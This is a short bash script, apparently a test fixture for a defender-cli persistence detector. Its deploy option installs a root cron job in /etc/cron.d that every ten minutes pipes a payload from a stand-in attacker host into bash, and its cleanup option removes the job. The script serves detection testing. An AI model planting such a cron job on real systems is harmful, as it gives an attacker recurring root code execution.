#!/usr/bin/env bash
# System cron persistence: a file in /etc/cron.d (distinct from root's crontab).
# Detected by: defender-cli anti-persistence --cron-system
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
CRON_FILE="/etc/cron.d/defender-test-system"
TAG="DEFENDER-TEST-cron-system"

case "${1:-}" in
  deploy)
    cat > "$CRON_FILE" << EOF
# $TAG
*/10 * * * * root curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh | bash
EOF
    chmod 644 "$CRON_FILE"
    echo "[+] 16_cron_system: $CRON_FILE installed"
    ;;
  cleanup)
    rm -f "$CRON_FILE"
    echo "[-] 16_cron_system: $CRON_FILE removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
